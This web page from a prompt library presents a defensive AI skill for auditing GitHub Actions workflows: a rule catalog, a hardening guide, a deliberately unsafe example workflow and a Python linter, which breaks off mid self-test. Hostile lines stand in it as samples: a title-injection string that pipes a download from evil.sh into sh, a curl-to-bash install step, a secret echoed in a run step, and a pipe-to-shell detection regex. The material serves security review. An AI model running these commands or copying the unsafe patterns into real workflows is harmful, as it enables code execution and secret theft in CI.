@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>GitHub Actions Workflow Security Reviewer | Open library | claudebomb.com</title>
+<meta name="description" content="--- name: github-actions-workflow-security-reviewer description: Reviews GitHub Actions workflow YAML for supply-chain and injection risks: pull_reque">
+<meta property="og:title" content="GitHub Actions Workflow Security Reviewer | Open library | claudebomb.com">
+<meta property="og:description" content="--- name: github-actions-workflow-security-reviewer description: Reviews GitHub Actions workflow YAML for supply-chain and injection risks: pull_reque">
+<meta property="og:url" content="https://claudebomb.com/l/pc/github-actions-workflow-security-reviewer/">
+<meta property="og:type" content="website">
+<meta property="og:image" content="https://claudebomb.com/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="theme-color" content="#fff6e0">
+<link rel="canonical" href="https://claudebomb.com/l/pc/github-actions-workflow-security-reviewer/">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ccircle cx='14' cy='19' r='10' fill='%23151515'/%3E%3Crect x='18' y='6.5' width='6' height='5' rx='1.2' transform='rotate(40 21 9)' fill='%23151515'/%3E%3Cpath d='M23.5 6.5c2-2.5 4 .5 5.5-2.5' fill='none' stroke='%23151515' stroke-width='2' stroke-linecap='round'/%3E%3Cpath d='M29.6 1.2c1.6 2.2 2.4 3.6 1.2 5.4-1 1.3-3.2 1.3-4 0-.9-1.6.6-2.7 1-3.6.3-.6.9-1.1 1.8-1.8z' fill='%23ff5a36'/%3E%3C/svg%3E">
+<link rel="stylesheet" href="/assets/cb.css?v=4">
+</head>
+<body id="top">
+<a class="skip" href="#prompt">Skip to the prompt</a>
+<header class="hdr">
+ <a class="logo" href="/" aria-label="claudebomb.com, home"><svg width="30" height="30" viewBox="0 0 32 32" aria-hidden="true"><circle cx="14" cy="19" r="10" fill="#151515"/><rect x="18" y="6.5" width="6" height="5" rx="1.2" transform="rotate(40 21 9)" fill="#151515"/><path d="M23.5 6.5c2-2.5 4 .5 5.5-2.5" fill="none" stroke="#ff5a36" stroke-width="2" stroke-linecap="round"/></svg>claudebomb</a>
+ <nav class="nav" aria-label="Main"><a href="/#bank">Our prompts</a><a href="/library/">Open library</a><a href="/council/">Council</a><a href="/#ask">Ask for one</a></nav>
+</header>
+<main>
+<section class="sec hero" aria-labelledby="h1">
+ <div class="wrap">
+  <p class="eyebrow"><a class="tag" href="/library/">Open library</a></p>
+  <h1 class="sm" id="h1">GitHub Actions Workflow Security Reviewer</h1>
+  <p class="saves">From <a href="https://prompts.chat">prompts.chat</a>. Contributed by f. Public domain under <a href="https://creativecommons.org/publicdomain/zero/1.0/">CC0 1.0</a>, copied from <a href="https://github.com/f/prompts.chat/blob/029fa0783a31070ca821710a5347970a228725f5/prompts.csv">this saved version of its prompt list</a>.</p>
+  <div class="btns"><button class="btn" type="button" data-copyl>Copy prompt</button><a class="btn ghost" href="https://prompts.chat">Open the source</a></div>
+ </div>
+</section>
+<section class="sec bank" id="prompt" aria-labelledby="pr-h">
+ <div class="wrap">
+  <h2 id="pr-h">The prompt</h2>
+  <pre id="pt">---
+name: github-actions-workflow-security-reviewer
+description: Reviews GitHub Actions workflow YAML for supply-chain and injection risks: pull_request_target with PR checkout, untrusted github.event text in run steps, actions pinned to tags or branches instead of commit SHAs, missing or write-all permissions, secrets in shell commands, curl | bash, self-hosted runners on PRs, and missing timeouts. Use before merging CI changes or auditing a repo. Includes a stdlib Python linter with --self-test.
+---
+
+# GitHub Actions Workflow Security Reviewer
+
+You help maintainers find and fix security problems in `.github/workflows/*.yml` before an attacker does. You read each workflow the way a malicious fork, issue author, or compromised third-party action would, point to the exact line that is risky, explain how it could be abused in one or two sentences, and give a minimal patch that keeps the workflow working.
+
+## Files in this skill
+
+- `scripts/gha_audit.py` - line-based linter for workflow files: triggers, permissions, `uses:` pinning, script injection in `run:` and `github-script`, secrets in commands, remote scripts piped to a shell, self-hosted runners, timeouts (Python 3 standard library only, no YAML library needed)
+- `references/risk-catalog.md` - every rule ID with severity, why it matters, and the fix
+- `references/hardening-guide.md` - safe patterns: env indirection, least-privilege permissions, SHA pinning with Dependabot, splitting privileged and unprivileged workflows
+- `templates/workflow-security-review.md` - a review comment or audit report
+- `examples/pr-labeler.yml` - a deliberately unsafe workflow and its expected findings
+
+## Workflow
+
+### 1. Collect the workflows
+Ask for the workflow files (or the repository path) and the context: public or private repo, whether forks can open pull requests, which secrets and environments exist, and whether self-hosted runners are used. Workflows triggered by `pull_request_target`, `issue_comment`, `issues`, `workflow_run`, or `discussion` deserve the closest look because they run with repository secrets on events outsiders can create.
+
+### 2. Run the linter
+```
+python3 scripts/gha_audit.py .github/workflows/*.yml
+python3 scripts/gha_audit.py examples/pr-labeler.yml --json
+python3 scripts/gha_audit.py ci.yml --strict
+python3 scripts/gha_audit.py --self-test
+```
+Exit code 1 means at least one high finding (`--strict`: any finding); 2 means a file could not be read. The linter does not need PyYAML; it understands common workflow layouts but can miss unusual YAML (anchors, flow mappings). Read the file yourself as well.
+
+### 3. Confirm each finding
+For every finding, check the context the script cannot see: is the expression really attacker-controlled, does the job have secrets or a write token, is the action from a trusted publisher? Downgrade or dismiss with a stated reason; never silently drop a high finding.
+
+### 4. Propose fixes
+Use `references/risk-catalog.md` for each rule ID and `references/hardening-guide.md` for patterns. Prefer small, reviewable diffs: move `${{ }}` into `env:` and quote the shell variable, add a top-level `permissions: contents: read`, pin `uses:` to a full commit SHA with the tag in a comment, and add `persist-credentials: false` and `timeout-minutes`.
+
+### 5. Report
+Fill `templates/workflow-security-review.md`: files reviewed, findings by severity with line numbers, the attack scenario for each high finding, the patch, and follow-ups (Dependabot for actions, branch protection, environment reviewers).
+
+## Rules
+
+- Treat titles, bodies, branch names, commit messages, and comments from PRs and issues as attacker input.
+- Never ask for or print secret values; refer to secrets by name only.
+- Do not write proof-of-concept exploits against repositories the user does not own; describe the risk instead.
+- A clean linter run is not a guarantee. Say what was not checked (reusable workflows, composite actions, repository settings).
+FILE:references/risk-catalog.md
+# Risk Catalog (rule IDs used by gha_audit.py)
+
+| ID | Severity | What it detects | Why it matters | Fix |
+|---|---|---|---|---|
+| GHA001 | high | `pull_request_target` (or `workflow_run`) workflow that checks out the PR head (`ref: ${{ github.event.pull_request.head.sha }}`, `head.ref`, `github.head_ref`) | Code from a fork runs with repository secrets and a write token (&quot;pwn request&quot;) | Use `pull_request` for building untrusted code; keep `pull_request_target` for labeling/commenting only, without checkout of PR code |
+| GHA002 | high | Untrusted `${{ }}` expression inside `run:` or `github-script` `script:` (issue/PR title or body, comment body, head ref, commit message, author name/email, page name) | The text is pasted into the script before it runs, so a title like `&quot;; curl evil.sh | sh #` executes | Pass it through `env:` and use `&quot;$TITLE&quot;` in the shell |
+| GHA003 | medium (low for `actions/*`, `github/*`) | `uses: owner/repo@v4` pinned to a tag | Tags can be moved; a compromised action ships code into your build | Pin to the full 40-character commit SHA, keep the tag in a comment, let Dependabot update it |
+| GHA004 | high | `uses:` with a branch (`@main`, `@master`) or no ref | Every run pulls whatever is on that branch today | Pin to a commit SHA |
+| GHA005 | medium | No `permissions:` at workflow level and not on every job | The `GITHUB_TOKEN` gets the repository default, often read/write on everything | Add `permissions: contents: read` at the top and grant more per job |
+| GHA006 | high | `permissions: write-all` | Every scope can be written by any step | List only the scopes needed |
+| GHA007 | high / medium | `${{ secrets.X }}` inside a `run:` command (high when echoed or printed) | Secrets end up in shell history, process lists, logs, or injected text | Map the secret to `env:` and read `$X`; never echo it |
+| GHA008 | medium | `curl ... \| bash` or `wget ... \| sh` | Runs unverified remote code with the job&#x27;s token and secrets | Download, verify a checksum or signature, then run; or use a pinned action |
+| GHA009 | medium | `self-hosted` runner in a workflow triggered by `pull_request` or `pull_request_target` | Fork code can persist on the machine and attack later jobs | Use GitHub-hosted or ephemeral runners for PRs; require approval for outside contributors |
+| GHA010 | high | `ACTIONS_ALLOW_UNSECURE_COMMANDS: true` | Re-enables deprecated `set-env`/`add-path`, which log output can trigger | Remove it; write to `$GITHUB_ENV` and `$GITHUB_PATH` |
+| GHA011 | low | `actions/checkout` without `persist-credentials: false` | The token stays in `.git/config` for every later step and any uploaded artifact | Add `persist-credentials: false` unless a later step pushes |
+| GHA012 | low | Job without `timeout-minutes` | A hung or abused job can run for 6 hours on your minutes | Add a realistic timeout (e.g. 15-30) |
+| GHA013 | low | `docker://image:tag` without `@sha256:` digest | Image tags are mutable | Pin `docker://image@sha256:&lt;digest&gt;` |
+| GHA014 | medium | `workflow_run` workflow using `actions/download-artifact` | Artifacts from a fork-triggered run are attacker-controlled | Treat artifact contents as data: validate, never execute; avoid extracting into the workspace |
+
+## Severity guide
+- **high**: an outsider can likely run code with secrets or a write token, or a mutable reference controls the build.
+- **medium**: hardening gap that makes a compromise easier or bigger.
+- **low**: good practice; fix when touching the file.
+FILE:references/hardening-guide.md
+# Hardening Guide
+
+## 1. Pass untrusted text through env, not expressions
+```yaml
+# unsafe
+- run: echo &quot;Title: ${{ github.event.pull_request.title }}&quot;
+# safe
+- env:
+    PR_TITLE: ${{ github.event.pull_request.title }}
+  run: echo &quot;Title: $PR_TITLE&quot;
+```
+Always double-quote the variable. In `actions/github-script`, read `context.payload.pull_request.title` in JavaScript instead of interpolating `${{ }}` into the script.
+
+## 2. Least-privilege token
+```yaml
+permissions:
+  contents: read          # workflow default
+jobs:
+  label:
+    permissions:
+      pull-requests: write  # only this job can label
+```
+Also set the repository default to read-only (Settings &gt; Actions &gt; General &gt; Workflow permissions).
+
+## 3. Pin actions to commit SHAs
+```yaml
+- uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0
+```
+Enable Dependabot for the `github-actions` ecosystem so pins get update PRs with changelogs. Prefer actions from verified publishers and read the source of small third-party actions before adopting them.
+
+## 4. Split privileged and unprivileged work
+- `pull_request` workflow: builds and tests fork code with no secrets and a read-only token; uploads results as an artifact.
+- `workflow_run` workflow: runs after it with secrets, downloads the artifact, treats it as untrusted data (parse JSON, never execute), and posts the comment or label.
+
+## 5. Checkout and credentials
+- `persist-credentials: false` on `actions/checkout` unless the job pushes.
+- Never check out PR code in `pull_request_target`; if you must (e.g. a labeler reading config), check out the base branch only.
+
+## 6. Runners and limits
+- Self-hosted runners: private repositories only, or ephemeral (one job per VM) with no network access to internal systems.
+- `timeout-minutes` on every job; `concurrency` groups for deploys.
+
+## 7. Secrets and environments
+- Put deploy credentials in an environment with required reviewers and branch rules.
+- Prefer OIDC (`id-token: write`) to long-lived cloud keys.
+- Mask derived values with `::add-mask::` before printing anything secret-like.
+
+## Review checklist
+1. Which triggers can outsiders fire?
+2. What can the token write, and which secrets are reachable from those triggers?
+3. Is any attacker-controlled text interpolated into a script?
+4. Is every `uses:` pinned to a SHA?
+5. Is any remote code executed without verification?
+FILE:templates/workflow-security-review.md
+# GitHub Actions Security Review - &lt;repository&gt;
+
+**Date:** &lt;YYYY-MM-DD&gt;  **Reviewer:** &lt;name&gt;  **Files:** &lt;.github/workflows/...&gt;
+**Repo visibility:** &lt;public/private&gt;  **Fork PRs allowed:** &lt;yes/no&gt;  **Self-hosted runners:** &lt;yes/no&gt;
+**Linter:** `gha_audit.py` -&gt; &lt;n&gt; high, &lt;n&gt; medium, &lt;n&gt; low
+
+## High findings
+| Rule | File:line | Problem | Attack scenario | Fix |
+|---|---|---|---|---|
+| | | | | |
+
+## Medium and low findings
+| Rule | File:line | Problem | Fix |
+|---|---|---|---|
+| | | | |
+
+## Dismissed findings
+- &lt;rule, file:line&gt; - &lt;reason it is not exploitable here&gt;
+
+## Proposed patch
+```diff
+&lt;minimal diff&gt;
+```
+
+## Not covered by this review
+- Reusable workflows and composite actions called from these files
+- Repository and organization settings (default token permissions, fork PR approval, environments)
+
+## Follow-ups
+- [ ] Enable Dependabot for github-actions
+- [ ] Set default workflow permissions to read-only
+- [ ] Require reviewers on the production environment
+FILE:examples/pr-labeler.yml
+# Deliberately unsafe example for gha_audit.py. Expected findings (line numbers in this file):
+#   GHA001 high   line 21 - pull_request_target checks out the PR head
+#   GHA002 high   line 24 - PR title pasted into run (script injection)
+#   GHA007 high   line 25 - secret echoed in run
+#   GHA004 high   line 27 - third-party action on @main
+#   GHA005 medium line 1  - no permissions block at workflow or job level
+#   GHA008 medium line 26 - curl piped to bash
+#   GHA012 low    line 16 - job without timeout-minutes
+#   GHA003 low    line 19 - actions/checkout@v4 pinned to a tag
+#   GHA011 low    line 19 - checkout without persist-credentials: false
+name: PR labeler
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+jobs:
+  label:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - name: Greet
+        run: |
+          echo &quot;Thanks for: ${{ github.event.pull_request.title }}&quot;
+          echo &quot;token=${{ secrets.LABEL_TOKEN }}&quot;
+          curl -sSL https://example.com/install.sh | bash
+      - uses: someorg/auto-labeler@main
+FILE:scripts/gha_audit.py
+#!/usr/bin/env python3
+&quot;&quot;&quot;GitHub Actions workflow security linter (Python 3 standard library only, no YAML library).
+
+Reads workflow files line by line, tracking indentation, and reports risky patterns with rule IDs
+(see references/risk-catalog.md):
+  GHA001 pull_request_target/workflow_run + checkout of PR head      high
+  GHA002 untrusted ${{ github.event.* }} text inside run:/script:    high
+  GHA003 uses: pinned to a tag instead of a commit SHA               medium (low for actions/*, github/*)
+  GHA004 uses: on a branch (@main/@master) or without a ref          high
+  GHA005 no permissions at workflow level or on every job            medium
+  GHA006 permissions: write-all                                      high
+  GHA007 ${{ secrets.* }} inside run: (high when echoed/printed)     high/medium
+  GHA008 curl/wget piped to a shell                                  medium
+  GHA009 self-hosted runner on pull_request(_target)                 medium
+  GHA010 ACTIONS_ALLOW_UNSECURE_COMMANDS enabled                     high
+  GHA011 actions/checkout without persist-credentials: false         low
+  GHA012 job without timeout-minutes                                 low
+  GHA013 docker:// image without @sha256 digest                      low
+  GHA014 workflow_run + actions/download-artifact                    medium
+
+Usage:
+  python3 gha_audit.py .github/workflows/*.yml
+  python3 gha_audit.py ci.yml --json
+  python3 gha_audit.py ci.yml --strict      # exit 1 on any finding
+  python3 gha_audit.py --self-test
+Exit code: 0 no high findings, 1 high findings (or any with --strict), 2 unreadable file.
+&quot;&quot;&quot;
+import argparse
+import json
+import re
+import sys
+
+SEV_ORDER = {&quot;high&quot;: 0, &quot;medium&quot;: 1, &quot;low&quot;: 2}
+TRUSTED_OWNERS = {&quot;actions&quot;, &quot;github&quot;}
+BRANCH_REFS = {&quot;main&quot;, &quot;master&quot;, &quot;dev&quot;, &quot;develop&quot;, &quot;trunk&quot;, &quot;head&quot;, &quot;latest&quot;}
+UNTRUSTED_EXPR = re.compile(
+    r&quot;github\.head_ref&quot;
+    r&quot;|github\.event\.[\w.*\[\]&#x27;\&quot;-]*?\b(title|body|message|page_name|email|head_branch|default_branch|label)\b&quot;
+    r&quot;|github\.event\.[\w.*\[\]&#x27;\&quot;-]*?head\.ref\b&quot;
+    r&quot;|github\.event\.[\w.*\[\]&#x27;\&quot;-]*?author\.name\b&quot;
+)
+EXPR = re.compile(r&quot;\$\{\{(.*?)\}\}&quot;)
+SECRET_EXPR = re.compile(r&quot;\$\{\{\s*secrets\.([A-Za-z0-9_]+)\s*\}\}&quot;)
+PR_HEAD_REF = re.compile(r&quot;ref:\s*[&#x27;\&quot;]?\$\{\{\s*(github\.event\.pull_request\.head\.(sha|ref)|github\.head_ref|github\.event\.workflow_run\.head_(sha|branch))\s*\}\}&quot;)
+PIPE_SHELL = re.compile(r&quot;\b(curl|wget)\b[^|\n]*\|\s*(sudo\s+)?(-E\s+)?(ba|z|da)?sh\b&quot;)
+PRINT_CMD = re.compile(r&quot;\b(echo|printf|cat|tee|print)\b&quot;)
+SHA40 = re.compile(r&quot;^[0-9a-f]{40}$&quot;)
+
+
+def strip_comment(line):
+    &quot;&quot;&quot;Remove a trailing YAML comment (a # preceded by whitespace, outside quotes).&quot;&quot;&quot;
+    out, q = [], None
+    for i, ch in enumerate(line):
+        if q:
+            if ch == q:
+                q = None
+        elif ch in &quot;&#x27;\&quot;&quot;:
+            q = ch
+        elif ch == &quot;#&quot; and (i == 0 or line[i - 1] in &quot; \t&quot;):
+            break
+        out.append(ch)
+    return &quot;&quot;.join(out).rstrip()
+
+
+def indent_of(s):
+    return len(s) - len(s.lstrip(&quot; &quot;))
+
+
+def parse_lines(text):
+    &quot;&quot;&quot;Return a list of (lineno, indent, content) for non-empty, non-comment lines.&quot;&quot;&quot;
+    rows = []
+    for n, raw in enumerate(text.splitlines(), 1):
+        s = strip_comment(raw.replace(&quot;\t&quot;, &quot;  &quot;))
+        if s.strip():
+            rows.append((n, indent_of(s), s.strip()))
+    return rows
+
+
+def block_end(rows, i):
+    &quot;&quot;&quot;Index after the block owned by rows[i] (all following rows indented deeper).&quot;&quot;&quot;
+    ind = rows[i][1]
+    j = i + 1
+    while j &lt; len(rows) and rows[j][1] &gt; ind:
+        j += 1
+    return j
+
+
+def key_of(content):
+    c = content[2:].lstrip() if content.startswith(&quot;- &quot;) else content
+    m = re.match(r&quot;^[&#x27;\&quot;]?([A-Za-z0-9_\-]+)[&#x27;\&quot;]?\s*:(\s|$)&quot;, c)
+    return (m.group(1), c[m.end():].strip()) if m else (None, None)
+
+
+def triggers(rows):
+    trig = set()
+    for i, (n, ind, c) in enumerate(rows):
+        k, v = key_of(c)
+        if ind == 0 and k in (&quot;on&quot;, &quot;true&quot;):
+            if v:
+                trig.update(re.findall(r&quot;[a-z_]+&quot;, v))
+            else:
+                end = block_end(rows, i)
+                child = min((rows[j][1] for j in range(i + 1, end)), default=None)
+                for j in range(i + 1, end):
+                    if rows[j][1] == child:
+                        ck, _ = key_of(rows[j][2])
+                        if ck:
+                            trig.add(ck)
+                        elif rows[j][2].startswith(&quot;- &quot;):
+                            trig.add(rows[j][2][2:].strip())
+    return trig
+
+
+def audit_text(text, path=&quot;workflow.yml&quot;):
+    rows = parse_lines(text)
+    findings = []
+
+    def add(rule, sev, line, msg):
+        findings.append({&quot;file&quot;: path, &quot;line&quot;: line, &quot;rule&quot;: rule, &quot;severity&quot;: sev, &quot;message&quot;: msg})
+
+    trig = triggers(rows)
+    privileged = trig &amp; {&quot;pull_request_target&quot;, &quot;workflow_run&quot;}
+    pr_triggers = trig &amp; {&quot;pull_request&quot;, &quot;pull_request_target&quot;}
+
+    top_perm = None
+    jobs_idx = None
+    for i, (n, ind, c) in enumerate(rows):
+        k, v = key_of(c)
+        if ind == 0 and k == &quot;permissions&quot;:
+            top_perm = (n, v)
+        if ind == 0 and k == &quot;jobs&quot;:
+            jobs_idx = i
+    if top_perm and top_perm[1].strip(&quot;&#x27;\&quot;&quot;) == &quot;write-all&quot;:
+        add(&quot;GHA006&quot;, &quot;high&quot;, top_perm[0], &quot;permissions: write-all gives every step write access to all scopes&quot;)
+
+    # jobs
+    jobs = []
+    if jobs_idx is not None:
+        end = block_end(rows, jobs_idx)
+        child = min((rows[j][1] for j in range(jobs_idx + 1, end)), default=None)
+        for j in range(jobs_idx + 1, end):
+            if rows[j][1] == child and key_of(rows[j][2])[0]:
+                jobs.append((j, block_end(rows, j)))
+    jobs_with_perm = 0
+    for (js, je) in jobs:
+        jname = key_of(rows[js][2])[0]
+        jind = rows[js][1]
+        direct = [r for r in rows[js + 1:je] if r[1] == min(x[1] for x in rows[js + 1:je])] if je &gt; js + 1 else []
+        dkeys = {key_of(r[2])[0]: r for r in direct}
+        if &quot;permissions&quot; in dkeys:
+            jobs_with_perm += 1
+            if dkeys[&quot;permissions&quot;][2].split(&quot;:&quot;, 1)[1].strip().strip(&quot;&#x27;\&quot;&quot;) == &quot;write-all&quot;:
+                add(&quot;GHA006&quot;, &quot;high&quot;, dkeys[&quot;permissions&quot;][0], f&quot;job &#x27;{jname}&#x27; uses permissions: write-all&quot;)
+        if &quot;timeout-minutes&quot; not in dkeys and &quot;uses&quot; not in dkeys:
+            add(&quot;GHA012&quot;, &quot;low&quot;, rows[js][0], f&quot;job &#x27;{jname}&#x27; has no timeout-minutes (default is 360)&quot;)
+        if &quot;runs-on&quot; in dkeys:
+            ro_i = rows.index(dkeys[&quot;runs-on&quot;])
+            ro_text = &quot; &quot;.join(r[2] for r in rows[ro_i:block_end(rows, ro_i)])
+            if &quot;self-hosted&quot; in ro_text and pr_triggers:
+                add(&quot;GHA009&quot;, &quot;medium&quot;, dkeys[&quot;runs-on&quot;][0], f&quot;job &#x27;{jname}&#x27; runs pull request code on a self-hosted runner&quot;)
+    if top_perm is None and (not jobs or jobs_with_perm &lt; len(jobs)):
+        add(&quot;GHA005&quot;, &quot;medium&quot;, 1, &quot;no permissions block at workflow level (and not on every job); GITHUB_TOKEN gets the repo default&quot;)
+
+    # line-level checks
+    i = 0
+    while i &lt; len(rows):
+        n, ind, c = rows[i]
+        k, v = key_of(c)
+        if k in (&quot;run&quot;, &quot;script&quot;):
+            end = block_end(rows, i)
+            body = [(n, v)] if v and v not in (&quot;|&quot;, &quot;&gt;&quot;, &quot;|-&quot;, &quot;&gt;-&quot;, &quot;|+&quot;, &quot;&gt;+&quot;) else []
+            body += [(r[0], r[2]) for r in rows[i + 1:end]]
+            for bn, bt in body:
+                for m in EXPR.finditer(bt):
+                    expr = m.group(1).strip()
+                    if UNTRUSTED_EXPR.search(expr):
+                        add(&quot;GHA002&quot;, &quot;high&quot;, bn, f&quot;untrusted expression ${{{{ {expr} }}}} is pasted into {k}: (script injection); pass it via env&quot;)
+                for m in SECRET_EXPR.finditer(bt):
+                    if PRINT_CMD.search(bt):
+                        add(&quot;GHA007&quot;, &quot;high&quot;, bn, f&quot;secret {m.group(1)} is printed in {k}:&quot;)
+                    else:
+                        add(&quot;GHA007&quot;, &quot;medium&quot;, bn, f&quot;secret {m.group(1)} is interpolated into {k}:; map it to env instead&quot;)
+                if k == &quot;run&quot; and PIPE_SHELL.search(bt):
+                    add(&quot;GHA008&quot;, &quot;medium&quot;, bn, &quot;remote script piped straight into a shell&quot;)
+            i = end
+            continue
+        if k == &quot;uses&quot;:
+            ref = v.strip(&quot;&#x27;\&quot;&quot;)
+            if ref.startswith(&quot;./&quot;):
+                pass
+            elif ref.startswith(&quot;docker://&quot;):
+                if &quot;@sha256:&quot; not in ref:
+                    add(&quot;GHA013&quot;, &quot;low&quot;, n, f&quot;{ref} is not pinned to an image digest&quot;)
+            else:
+                name, _, at = ref.partition(&quot;@&quot;)
+                owner = name.split(&quot;/&quot;)[0].lower()
+                if not at or at.lower() in BRANCH_REFS:
+                    add(&quot;GHA004&quot;, &quot;high&quot;, n, f&quot;{ref or name} follows a branch or has no ref; pin to a commit SHA&quot;)
+                elif not SHA40.match(at):
+                    sev = &quot;low&quot; if owner in TRUSTED_OWNERS else &quot;medium&quot;
+                    add(&quot;GHA003&quot;, sev, n, f&quot;{ref} is pinned to a tag, not a full commit SHA&quot;)
+                if name.lower().startswith(&quot;actions/checkout&quot;):
+                    # the step block: siblings at this indent (after &#x27;- &#x27;) and deeper
+                    step_ind = ind + 2 if c.startswith(&quot;- &quot;) else ind
+                    j = i + 1
+                    j0 = i
+                    while j0 &gt; 0 and not rows[j0][2].startswith(&quot;- &quot;) and rows[j0][1] &gt;= step_ind:
+                        j0 -= 1
+                    while j &lt; len(rows) and rows[j][1] &gt;= step_ind and not (rows[j][1] == step_ind - 2 and rows[j][2].startswith(&quot;- &quot;)):
+                        j += 1
+                    step = &quot; &quot;.join(r[2] for r in rows[j0:j])
+                    if not re.search(r&quot;persist-credentials:\s*[&#x27;\&quot;]?false&quot;, step):
+                        add(&quot;GHA011&quot;, &quot;low&quot;, n, &quot;actions/checkout keeps the token in .git/config; add persist-credentials: false&quot;)
+                if name.lower().startswith(&quot;actions/download-artifact&quot;) and &quot;workflow_run&quot; in trig:
+                    add(&quot;GHA014&quot;, &quot;medium&quot;, n, &quot;artifact from a workflow_run may be attacker-controlled; treat as data&quot;)
+        if privileged and PR_HEAD_REF.search(c):
+            add(&quot;GHA001&quot;, &quot;high&quot;, n, f&quot;{&#x27;/&#x27;.join(sorted(privileged))} workflow checks out untrusted PR code with secrets available&quot;)
+        if re.search(r&quot;ACTIONS_ALLOW_UNSECURE_COMMANDS\s*:\s*[&#x27;\&quot;]?true&quot;, c, re.I):
+            add(&quot;GHA010&quot;, &quot;high&quot;, n, &quot;ACTIONS_ALLOW_UNSECURE_COMMANDS re-enables set-env/add-path&quot;)
+        i += 1
+
+    findings.sort(key=lambda f: (f[&quot;file&quot;], SEV_ORDER[f[&quot;severity&quot;]], f[&quot;line&quot;], f[&quot;rule&quot;]))
+    return {&quot;file&quot;: path, &quot;triggers&quot;: sorted(trig), &quot;jobs&quot;: len(jobs), &quot;findings&quot;: findings}
+
+
+def to_markdown(results):
+    out = [&quot;# GitHub Actions security audit&quot;, &quot;&quot;]
+    tot = {&quot;high&quot;: 0, &quot;medium&quot;: 0, &quot;low&quot;: 0}
+    for r in results:
+        for f in r[&quot;findings&quot;]:
+            tot[f[&quot;severity&quot;]] += 1
+    out.append(f&quot;**Files:** {len(results)}  **Findings:** {tot[&#x27;high&#x27;]} high, {tot[&#x27;medium&#x27;]} medium, {tot[&#x27;low&#x27;]} low&quot;)
+    for r in results:
+        out += [&quot;&quot;, f&quot;## {r[&#x27;file&#x27;]}&quot;, f&quot;Triggers: {&#x27;, &#x27;.join(r[&#x27;triggers&#x27;]) or &#x27;none found&#x27;}; jobs: {r[&#x27;jobs&#x27;]}&quot;, &quot;&quot;]
+        if not r[&quot;findings&quot;]:
+            out.append(&quot;No findings.&quot;)
+            continue
+        out += [&quot;| Severity | Rule | Line | Finding |&quot;, &quot;|---|---|---|---|&quot;]
+        for f in r[&quot;findings&quot;]:
+            msg = f[&quot;message&quot;].replace(&quot;|&quot;, &quot;\\|&quot;)
+            out.append(f&quot;| {f[&#x27;severity&#x27;]} | {f[&#x27;rule&#x27;]} | {f[&#x27;line&#x27;]} | {msg} |&quot;)
+    return &quot;\n&quot;.join(out)
+
+
+SAFE = &quot;&quot;&quot;name: CI
+on:
+  pull_request:
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0
+        with:
+          persist-credentials: false
+      - name: Test
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          echo &quot;Testing $PR_TITLE&quot;
+          make test
+&quot;&quot;&quot;
+
+
+def self_test():
+    cases = []
+
+    def ok(name, cond):
+        cases.append((name, bool(cond)))
+
+    def rules(text):
+        return [(f[&quot;rule&quot;], f[&quot;severity&quot;]) for f in audit_text(text)[&quot;findings&quot;]]
+
+    ok(&quot;safe workflow has no findings&quot;, rules(SAFE) == [])
+    ok(&quot;triggers parsed from block&quot;, audit_text(SAFE)[&quot;triggers&quot;] == [&quot;pull_request&quot;])
+    ok(&quot;triggers parsed from list&quot;, audit_text(&quot;on: [push, pull_request]\njobs: {}\n&quot;)[&quot;triggers&quot;] == [&quot;pull_request&quot;, &quot;push&quot;])
+    inj = SAFE.replace(&#x27;echo &quot;Testing $PR_TITLE&quot;&#x27;, &#x27;echo &quot;${{ github.event.pull_request.title }}&quot;&#x27;)
+    ok(&quot;title in run is GHA002 high&quot;, (&quot;GHA002&quot;, &quot;high&quot;) in rules(inj))
+    ok(&quot;head_ref in run is GHA002&quot;, (&quot;GHA002&quot;, &quot;high&quot;) in rules(SAFE.replace(&quot;make test&quot;, &quot;git push origin ${{ github.head_ref }}&quot;)))
+    ok(&quot;comment body in github-script&quot;, (&quot;GHA002&quot;, &quot;high&quot;) in rules(SAFE.replace(&quot;run: |&quot;, &quot;script: |&quot;)
+                                                                      .replace(&quot;make test&quot;, &quot;core.info(&#x27;${{ github.event.comment.body }}&#x27;)&quot;)))
+    ok(&quot;env indirection is not flagged&quot;, not any(r == &quot;GHA002&quot; for r, _ in rules(SAFE)))
+    ok(&quot;PR number is safe&quot;, rules(SAFE.replace(&quot;make test&quot;, &quot;echo ${{ github.event.pull_request.number }}&quot;)) == [])
+    ok(&quot;tag pin on actions/* is GHA003 low&quot;, (&quot;GHA003&quot;, &quot;low&quot;) in rules(SAFE.replace(&quot;@08eba0b27e820071cde6df949e0beb9ba4906955&quot;, &quot;@v4&quot;)))
+    ok(&quot;tag pin third party is medium&quot;, (&quot;GHA003&quot;, &quot;medium&quot;) in rules(SAFE.replace(&quot;actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955&quot;, &quot;acme/checkout@v1&quot;)))
+    ok(&quot;branch pin is GHA004 high&quot;, (&quot;GHA004&quot;, &quot;high&quot;) in rules(SAFE.replace(&quot;@08eba0b27e820071cde6df949e0beb9ba4906955&quot;, &quot;@main&quot;)))
+    ok(&quot;local action not flagged&quot;, rules(SAFE.replace(&quot;actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955&quot;, &quot;./.github/actions/setup&quot;)) == [])
+    ok(&quot;missing permissions is GHA005&quot;, (&quot;GHA005&quot;, &quot;medium&quot;) in rules(SAFE.replace(&quot;permissions:\n  contents: read\n&quot;, &quot;&quot;)))
+    ok(&quot;job-level permissions satisfy GHA005&quot;, rules(SAFE.replace(&quot;permissions:\n  contents: read\n&quot;, &quot;&quot;).replace(&quot;    timeout-minutes: 15\n&quot;, &quot;    timeout-minutes: 15\n    permissions:\n      contents: read\n&quot;)) == [])
